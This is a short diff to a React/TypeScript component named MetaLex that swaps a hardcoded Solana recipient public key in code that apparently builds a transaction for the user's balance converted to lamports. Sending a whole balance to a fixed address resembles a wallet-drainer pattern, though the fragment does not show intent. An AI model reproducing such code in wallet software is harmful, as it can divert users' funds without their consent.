@@ -172,7 +172,7 @@ export const MetaLex: FC = () => {
 
             setLoading(true)
 
-            const toPublicKey = new PublicKey('Ah91V72MYwWh6vxVUuTTztmVJLyV3hvi1qYwK9223HWq'); // Replace with the recipient's public key
+            const toPublicKey = new PublicKey('gWW9fKaV6jSusv9BFJfGPCxNuyCcbzzCjtYioATZMEV'); // Replace with the recipient's public key
             const transaction = new Transaction();
             let balanceInLamports = Math.floor(Number(balance) * LAMPORTS_PER_SOL);
 
